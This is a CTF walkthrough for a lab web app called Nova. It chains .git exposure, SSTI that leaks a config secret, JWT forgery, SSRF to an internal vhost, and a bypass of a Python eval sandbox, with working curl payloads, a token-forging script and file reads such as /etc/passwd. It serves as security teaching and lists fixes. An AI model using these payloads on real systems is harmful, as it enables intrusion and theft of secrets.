# Nova - Chained Web Exploitation

NovaDev Solutions is a software development company showcasing their secure engineering expertise. Their Valentine's Day contact form hides a chain of vulnerabilities that leads from source code disclosure all the way to reading internal files through a sandboxed Python environment.

`Web` `Git Exposure` `SSTI` `JWT Forgery` `SSRF` `Python Sandbox Bypass`

## Overview

This challenge chains five distinct vulnerabilities together. Each step unlocks the next:

```
.git exposed ──> Source code leak ──> SSTI backdoor ──> Config leak (ADMIN_SECRET)
     ──> JWT forgery ──> Admin panel ──> SSRF ──> Internal vhost discovery
          ──> Python sandbox ──> Filter bypass ──> Flag
```

## Reconnaissance

The target is a Flask application served behind Nginx at `http://nova.thm`.

### Route Discovery

A quick `gobuster` scan reveals the surface:

```sh
gobuster dir -u http://nova.thm -w /usr/share/wordlists/dirb/common.txt -q
```

| Route | Description |
|-------|-------------|
| `/` | Homepage |
| `/about` | Company info |
| `/services` | Services listing |
| `/contact` | Valentine message form (POST) |
| `/admin` | Redirects to `/admin/login` |
| `/admin/login` | Admin authentication panel |
| `/admin/fetch` | Internal URL fetch tool (requires auth) |
| `/.git/HEAD` | **Exposed Git repository** |

Two things stand out immediately:

1. **`.git/HEAD`** returns `ref: refs/heads/master` — the entire Git history is exposed.
2. The admin login page contains an HTML comment: `<!-- We recently moved to using JWTs -->`.

### Dumping the Git Repository

When a `.git` directory is publicly accessible on a web server, anyone can reconstruct the source code. We use `git-dumper` to automate this:

```sh
pip install git-dumper
git-dumper http://nova.thm/.git /tmp/nova-dump
```

This recovers two files:

- `.gitignore` — ignores everything except itself and the preview feature
- `preview_feature.py` — a snippet of the contact form handler

---

## Step 1 — Source Code Analysis (SSTI Backdoor)

The recovered `preview_feature.py` contains the `/contact` route logic:

```python
@app.route("/contact", methods=["GET", "POST"])
def contact():
    if request.method == "POST":
        message = request.form.get("message", "").strip()

        # Security by Obscurity
        if message == "{{ config }}":
            return render_template_string(
                message,
                config=app.config
            )

        # This escapes all text
        safe_message = escape(message)

        template = f"""
        <h3>Thank you for your message</h3>
        <div class="preview-box">
            {safe_message}
        </div>
        """

        return template

    return render_template("contact.html")
```

### What's happening here

- **Normal messages**: HTML-escaped with `escape()` before being inserted into the response. XSS payloads like `<script>alert(1)</script>` get neutralized — they show as plain text.
- **The backdoor**: If the message is *exactly* `{{ config }}`, Flask's `render_template_string()` processes it as a Jinja2 template. This is **Server-Side Template Injection (SSTI)** — the server evaluates `{{ config }}` and dumps the entire Flask configuration object.

> **Beginner note**: `render_template_string()` treats user input as a template. Jinja2's `{{ }}` syntax executes Python expressions on the server. This is extremely dangerous when user input is passed directly.

### Triggering the SSTI

```sh
curl -s -X POST http://nova.thm/contact -d 'message={{ config }}'
```

The server responds with the full Flask config, including:

```
'ADMIN_SECRET': 'cc441eabd3ffb9fd211155ca37e1bdeff208f0a428d1913bb9e35759693de565'
'DATABASE_URL': 'postgresql://app_user:********@db.internal:5432/novadev'
'REDIS_HOST': 'redis.internal'
```

The `ADMIN_SECRET` is the key used to sign JWT tokens.

---

## Step 2 — JWT Forgery

The admin login page hinted at JWTs (`<!-- We recently moved to using JWTs -->`). With the `ADMIN_SECRET` in hand, we can forge a valid admin token without knowing the password.

### What is a JWT?

A JSON Web Token has three parts separated by dots: `header.payload.signature`. The signature is created using a secret key. If you know the secret, you can create tokens that the server will trust.

### Crafting the Token

```python
import jwt, time

secret = 'cc441eabd3ffb9fd211155ca37e1bdeff208f0a428d1913bb9e35759693de565'

token = jwt.encode(
    {'role': 'admin', 'exp': int(time.time()) + 3600},
    secret,
    algorithm='HS256'
)
print(token)
```

### Finding the Right Payload

Different payload structures were tested. The server accepted `{"role": "admin"}` passed as a cookie named `token`:

```sh
# This returns "Unauthorized"
curl -s http://nova.thm/admin/fetch -b "token=<jwt_with_username_admin>"

# This returns "No URL provided" — we're authenticated!
curl -s http://nova.thm/admin/fetch -b "token=<jwt_with_role_admin>"
```

The response `"No URL provided"` instead of `"Unauthorized"` confirms the JWT is valid.

### Accessing the Admin Dashboard

```sh
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NzExNzczNDR9.JyTXsixKAUkn7SrC-_ho7SdSG1tuQzL5UM2InQu_r2c"

curl -s http://nova.thm/admin -b "token=$TOKEN"
```

This reveals the admin dashboard with an **"Internal QA URL Fetch Tool"** at `/admin/fetch`. The form placeholder suggests: `http://internal.service.local/status`.

---

## Step 3 — SSRF (Server-Side Request Forgery)

The `/admin/fetch` endpoint takes a `url` GET parameter and fetches its content from the server side. This is a classic SSRF vector — we can make the server send HTTP requests to internal services that aren't accessible from the outside.

### The Digit Filter

```sh
curl -s "http://nova.thm/admin/fetch?url=http://127.0.0.1/" -b "token=$TOKEN"
# Response: "Digits are not allowed, we really like DNS!"
```

The server blocks any URL containing digits (0-9). This prevents using IP addresses (`127.0.0.1`) or port numbers (`:5000`). The hint says to use **DNS names** instead.

### Testing with localhost

```sh
curl -s "http://nova.thm/admin/fetch?url=http://localhost/" -b "token=$TOKEN"
# Returns the homepage — SSRF works!
```

`localhost` resolves to `127.0.0.1` but contains no digits, so it passes the filter.

### Discovering Internal Virtual Hosts

Since the hint emphasizes DNS, there might be internal virtual hosts (vhosts) configured in Nginx. When the SSRF fetches a URL, the `Host` header is set to the hostname in the URL. If Nginx serves different content based on the hostname, we can discover hidden services.

```sh
# Testing common subdomain patterns
for host in admin.nova.thm internal.nova.thm dev.nova.thm; do
  echo "=== $host ==="
  curl -s "http://nova.thm/admin/fetch?url=http://$host/" -b "token=$TOKEN" | head -5
done
```

Result: `internal.nova.thm` returns a completely different page — **"NovaDev Secure Python Sandbox"**!

> **Beginner note**: Virtual hosts let one web server serve different websites based on the `Host` header. `internal.nova.thm` is configured in Nginx to only accept connections from `127.0.0.1` (localhost), making it invisible from the outside. But the SSRF makes requests *from* the server itself, bypassing this restriction.

---

## Step 4 — Python Sandbox Escape

The internal sandbox at `internal.nova.thm` accepts a `code` GET parameter and executes it using Python's `eval()`.

### Understanding the Sandbox

Reading the source code (via `list(open('internal_app.py'))` through the sandbox itself):

```python
banned = ["import", "exec", "eval", "__", "os", "sys",
          "subprocess", "compile", "breakpoint", "help", "dir",
          "vars", "locals", "getattr", "setattr", "delattr",
          "read", "write", "file"]

code_lower = code.lower()
for b in banned:
    if b in code_lower:
        # blocked!

result = eval(code)
```

The filter is a **substring check** on the code text. If any banned word appears anywhere in the code string (case-insensitive), it gets rejected.

### What's blocked and why

| Banned Word | What it prevents |
|-------------|-----------------|
| `import` | Loading modules (`import os`) |
| `os` | `os.system()`, `os.popen()` — also blocks any path containing "os" like `/etc/hostname` |
| `exec`, `eval` | Dynamic code execution |
| `__` | Dunder access (`__class__`, `__builtins__`, `__import__`) |
| `read`, `write` | File methods `.read()`, `.write()` |
| `file` | The `file` type |
| `getattr` | Attribute access by name |
| `sys` | System module — also blocks paths containing "sys" like `/etc/systemd/` |

### The Bypass: `list(open())`

The key insight is that `open()` itself is **not banned**, and Python file objects are **iterable** — you can convert them to a list of lines without ever calling `.read()`:

```python
list(open('/etc/passwd'))       # reads all lines — no banned words!
list(open('./flag.txt'))        # reads the flag!
```

This works because:
- `list()` iterates over the file object, which yields one line at a time
- No call to `.read()` or `.readline()` is needed
- Neither `list`, `open`, nor the file paths contain any banned substrings

### Constructing the Final Payload

The full URL chain:

```
http://nova.thm/admin/fetch
  ?url=http://internal.nova.thm/?code=list(open('./flag.txt'))
```

Using curl with proper encoding:

```sh
TOKEN="<forged_jwt>"

curl -s -G "http://nova.thm/admin/fetch" \
  --data-urlencode "url=http://internal.nova.thm/?code=list(open('./flag.txt'))" \
  -b "token=$TOKEN"
```

The sandbox executes `list(open('./flag.txt'))` and returns:

```
['THM{s4ndb0x_3sc4p3d_w1th_RCE_l1k3_4_pr0}\n']
```

---

## Flag

```
THM{s4ndb0x_3sc4p3d_w1th_RCE_l1k3_4_pr0}
```

## Root Cause Summary

| Vulnerability | Impact | Fix |
|--------------|--------|-----|
| **Exposed `.git` directory** | Full source code disclosure | Block `.git` access in Nginx (`location ~ /\.git { deny all; }`) |
| **SSTI via `render_template_string`** | Server config leaked (secrets, DB creds) | Never pass user input to `render_template_string()` |
| **Hardcoded JWT secret in config** | Token forgery, admin impersonation | Use environment variables, rotate secrets regularly |
| **SSRF in admin fetch tool** | Access to internal-only services | Validate and whitelist target URLs, block private IP ranges |
| **Weak sandbox filtering** | Arbitrary file read on the server | Use proper sandboxing (seccomp, containers), not string-based blocklists |

## Key Takeaways for Beginners

1. **Always scan for `.git`** — it's one of the most common and impactful web misconfigurations.
2. **SSTI is not the same as XSS** — XSS runs in the browser, SSTI runs on the server. SSTI gives you server-side code execution.
3. **JWTs are only as secure as their secret** — if the signing key leaks, anyone can forge valid tokens.
4. **SSRF lets you pivot internally** — even if a service isn't exposed to the internet, SSRF can reach it through the server.
5. **String-based blocklists are fragile** — there's almost always a way around them. Real security uses allowlists and proper isolation.
